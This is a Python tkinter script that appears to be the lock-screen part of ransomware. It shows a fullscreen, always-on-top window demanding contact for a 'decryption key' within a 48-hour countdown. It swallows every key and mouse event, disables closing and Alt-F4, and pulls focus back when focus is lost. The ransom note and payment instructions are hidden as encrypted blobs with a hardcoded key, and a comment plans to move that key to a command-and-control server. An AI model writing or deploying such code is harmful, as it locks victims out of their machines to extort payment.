#!/usr/bin/env python3
import tkinter as tk
from tkinter import ttk, HORIZONTAL
import time

from cryptography.fernet import Fernet

TOTAL_TIME = 48 * 60 *60
BACKGROUND_COLOR = "#0D0D0D" # Koyu Siyah
ACCENT_COLOR = "#D90000"    # Koyu Kırmızı (Tehlike)
TEXT_COLOR = "#EEEEEE"      # Beyazımsı Gri
TIMER_COLOR = "#00FF00"     # Parlak Yeşil


#For text encryption

#Later, put this to C2 side
FERNET_KEY = b'vEkxJSlEyFo_ZnsAoBJAX4cdb4SY57lZfFid27L9YBo='
ENCRYPTED_NOTE: bytes = b'gAAAAABpgFHPOVUt7wFT891ky9c180TOim-qZ4_Fl2dpgnu-F0TTICwIeGiw-AOgNoR4KRG2lODQ6P9Hv8-xweNbv3bX-oPWrkepwYV-84QMNwQSkRO3uw9EIpb50QSCFIwjXVDKVCIs1hxW8w5omDhouK-HTpgjec_Gbdb5pljP8n6SX-AMshEtQGQxYWVAZ3WDf75m8mmvE-Yz_nI_faRkI72IoYLT8lGHHgYYr9gus_66FDVlgsrXG2U1gYwMOOGw1IosqjdOAvv_OFyfiBZf1Gh-440t7fDHEIqBpD29Yu1agjn2W9pgmP7CqMpdZvHrKzc87HpCWT5DjK45wpj0K0gVYUUavo-ymosQElzygHrWWXcnsqjvCS71CMxQwdayixS63_qvui6F0XS5TvU1XA8Z-cwhFnqzLt-aO0TPZfH_y5Qpow-yMyPRknzJYeC6XV6N8ilAf01AnAuiZ3SbxzLWDa_u0zzSjSTyb6xnl_H59Sj83AS7y2Q15RQlTDPw0AeXpfZ5I2zWs3iZnjLm8UhMBlZPdQDTZR00-f8wZHRB2__CHd8Nh_FrUDJXAcZ7AeNlIsRA'
ENCRYPTED_INSTRUCTIONS: bytes = b'gAAAAABpgFHPbCk7iVDwPtMqhoih5tzWu7-8VJ1V-B2tPVNwj--7khN47HqjiNEO_P3AQHvyI3U6YJFDYchL9MJMo_cjBqK-ox2FyNJJWyvT6D_s2FC-UqgQ8JcjDjuuGJWmBlqyhJCt4pDGfVkaHlY5R6YYcubxlW1ojfhl05jjyxqmzO_19oKr1tEJqB_sWOq4VQCWjCVjd7A_-76xEqsGf9mJd_n4RfqyIdrxPG0IMmE4ElX6jpW1HOdfUyMarowiRDfgE9x4G6moY55Z4ResEYsPjWk6nlODUfSsrXT-QgkJ7Ku9nedv7rVdXSyuszVf6rpr3txxHpvVJ_6PxDNv1ntVL3HHaRVJJ9hCDCdRBy-ikoczhOKHJuSokDswE-LRF26NRAfUkzH0k8SCywTBWvur7D_xIZfTAdcN61UIUUp4E_Tykewuv1da3iblcF-10el11pLL4EP66Linlwk8N6cilus5HKy87x8HnmZodqBBOcI5SwjRCLYu4xhn8jZm0EaEb6xaY5iSp_Ci48NychSvman21Pbb4olR1vT0bMQdHMeFWQytsujg-gj8iGOP1bNRCNBT'

fernet = Fernet(FERNET_KEY)

def get_string(enc: bytes) -> str:
    return fernet.decrypt(enc).decode('utf-8')



class ProgressApp:

    def __init__(self, root):
        self.root = root
        self.root.title("ACCESS DENIED: CONTACT FOR DECRYPTION KEY")
        self.root.geometry(f"{self.root.winfo_screenwidth()}x{self.root.winfo_screenheight()}")

        self.main_frame = tk.Frame(root, bg=BACKGROUND_COLOR)
        self.main_frame.pack(expand=True, fill="both", padx=50, pady=50)

        self.label_title = tk.Label(
            self.main_frame,
            text="You are allotted 48 HOURS",
            font=("Arial", 20, "bold"),
            bg=BACKGROUND_COLOR,
            fg=ACCENT_COLOR
        )
        self.label_title.pack(pady=(35, 10))
        # ──────────────────────────────
        self.ransom_note = get_string(ENCRYPTED_NOTE)
        self.payment_instructions = get_string(ENCRYPTED_INSTRUCTIONS)

        self.start_time = time.time()
        self.time_label = tk.Label(
            self.main_frame,
            text="",
            font=("Consolas", 14),
            bg=BACKGROUND_COLOR,
            fg=ACCENT_COLOR
        )
        self.time_label.pack(side="bottom", pady=10)

        self.expire = tk.Label(
        self.main_frame,
        text="",
        font=("Consolas", 12),
        bg=BACKGROUND_COLOR,
        fg=ACCENT_COLOR
    )
        self.expire.pack(side="bottom", pady=10)


        self.label = tk.Label(
            self.main_frame,
            text= self.ransom_note,
            font=("Arial", 16),
            bg=BACKGROUND_COLOR,
            fg=TEXT_COLOR,
            justify="center",
            wraplength=800
        )
        self.label.pack(expand=True)

        self.label_instructions = tk.Label(
            self.main_frame,
            text= self.payment_instructions,
            font=("Consolas", 14),
            bg=BACKGROUND_COLOR,
            fg=TEXT_COLOR,
            justify="left",
            wraplength=800

        )
        self.label_instructions.pack(pady=10, anchor='center')

        self.progress = ttk.Progressbar(
            self.main_frame,
            length=300,
            mode="determinate")
        self.progress.pack(pady=(0, 10))

        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TProgressbar", troughcolor="#2e2e2e", background="#00ff99", thickness=20)

        self.update_clock()
        self.update_progress()


    def update_clock(self):
        current_time = time.strftime("%Y-%m-%d %H:%M:%S")
        self.time_label.config(text=current_time)
        self.root.after(1000, self.update_clock)

    def update_progress(self):
        elapsed = time.time() - self.start_time
        remaining = TOTAL_TIME - elapsed

        if remaining < 0:
            remaining = 0

        percent = ((TOTAL_TIME -remaining) / TOTAL_TIME) * 100
        self.progress["value"] = percent

        hrs = int(remaining //3600)
        mins = int((remaining % 3600) // 60)
        secs = int(remaining % 60)
        self.expire.config(
            text=f"Remaining Time: {hrs:02d}:{mins:02d}:{secs:02d}",
            font=("Arial", 16),
            bg="#1e1e1e",
            fg="#ffffff"
        )
        if remaining >0:
            self.root.after(1000, self.update_progress)
        else:
            self.expire.config(text="TIME EXPIRED")

def disable_event():
    return "break"

def ignore_all_keys(event):
    return "break"

def prevent_focus_loss(event):
    root.focus_force()
    return "break"

if __name__ == "__main__":
    root = tk.Tk()
    app = ProgressApp(root)
    root.overrideredirect(True)

    try:
        root.attributes("-fullscreen", True)
    except Exception:
        root.geometry("{0}x{1}+0+0".format(root.winfo_screenwidth(), root.winfo_screenheight()))

    root.attributes("-topmost", True)
    root.protocol("WM_DELETE_WINDOW", disable_event)

    for sequence in ("<Alt-F4>", "<Escape>", "<Control-q>", "<Control-Q>"):
        root.bind_all(sequence, lambda e: "break")

    root.bind_all("<Key>", ignore_all_keys)

    root.bind_all("<Button>", lambda e: "break")
    root.bind_all("<Button-1>", lambda e: "break")
    root.bind_all("<Button-2>", lambda e: "break")
    root.bind_all("<Button-3>", lambda e: "break")

    root.bind("<FocusOut>", prevent_focus_loss)

    frame = tk.Frame(root)
    frame.pack(expand=True, fill="both")



    try:
        root.grab_set()
        root.grab_release()
    except Exception:
        pass

    root.focus_force()
    root.mainloop()
